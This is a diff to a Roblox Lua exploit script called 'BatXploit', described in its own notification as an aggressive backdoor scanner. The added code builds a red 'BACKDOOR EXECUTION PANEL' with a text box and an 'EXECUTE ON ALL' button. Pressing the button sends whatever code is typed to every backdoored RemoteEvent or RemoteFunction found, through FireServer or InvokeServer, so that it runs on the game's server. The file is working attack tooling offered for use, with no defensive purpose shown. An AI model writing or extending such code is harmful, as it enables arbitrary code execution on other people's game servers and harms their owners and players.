@@ -279,3 +279,66 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
     Text = "🔥 AGGRESSIVE SCANNER LOADED - USE WITH CAUTION 🔥",
     Duration = 5
 })
+-- Принудительное создание панели управления, если бэкдоры найдены
+if foundBackdoors and #foundBackdoors > 0 then
+    -- Проверяем, нет ли уже панели
+    if not mainFrame:FindFirstChild("ControlPanel") then
+        local controlFrame = Instance.new("Frame")
+        controlFrame.Name = "ControlPanel"
+        controlFrame.Size = UDim2.new(1, -20, 0, 120)
+        controlFrame.Position = UDim2.new(0, 10, 1, -130)
+        controlFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
+        controlFrame.BorderSizePixel = 2
+        controlFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+        controlFrame.Parent = mainFrame
+
+        local execTitle = Instance.new("TextLabel")
+        execTitle.Size = UDim2.new(1, 0, 0, 20)
+        execTitle.Text = "🔥 BACKDOOR EXECUTION PANEL 🔥"
+        execTitle.TextColor3 = Color3.fromRGB(255, 0, 0)
+        execTitle.BackgroundTransparency = 1
+        execTitle.Font = Enum.Font.SourceSansBold
+        execTitle.Parent = controlFrame
+
+        local execBox = Instance.new("TextBox")
+        execBox.Size = UDim2.new(0, 400, 0, 60)
+        execBox.Position = UDim2.new(0, 10, 0, 25)
+        execBox.Text = "print('BatXploit backdoor test')"
+        execBox.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+        execBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+        execBox.TextWrapped = true
+        execBox.Parent = controlFrame
+
+        local execBtn = Instance.new("TextButton")
+        execBtn.Size = UDim2.new(0, 150, 0, 60)
+        execBtn.Position = UDim2.new(0, 420, 0, 25)
+        execBtn.Text = "💀 EXECUTE ON ALL 💀"
+        execBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
+        execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        execBtn.BorderSizePixel = 2
+        execBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
+        execBtn.Font = Enum.Font.SourceSansBold
+        execBtn.Parent = controlFrame
+
+        execBtn.MouseButton1Click:Connect(function()
+            for _, bd in ipairs(foundBackdoors) do
+                pcall(function()
+                    if bd.remote:IsA("RemoteEvent") then
+                        bd.remote:FireServer(execBox.Text)
+                    else
+                        bd.remote:InvokeServer(execBox.Text)
+                    end
+                end)
+                addResult("💀 EXECUTED ON: " .. bd.path, Color3.fromRGB(255, 50, 50), false)
+                task.wait()
+            end
+            addResult("🔥 EXECUTION COMPLETE ON ALL BACKDOORS 🔥", Color3.fromRGB(0, 255, 0), true)
+        end)
+        
+        addResult("🔥 CONTROL PANEL CREATED! Use it to execute code on backdoors 🔥", Color3.fromRGB(0, 255, 0), true)
+    else
+        addResult("⚠️ Control panel already exists", Color3.fromRGB(255, 255, 0), false)
+    end
+else
+    addResult("⚠️ No backdoors found, cannot create control panel", Color3.fromRGB(255, 255, 0), false)
+end
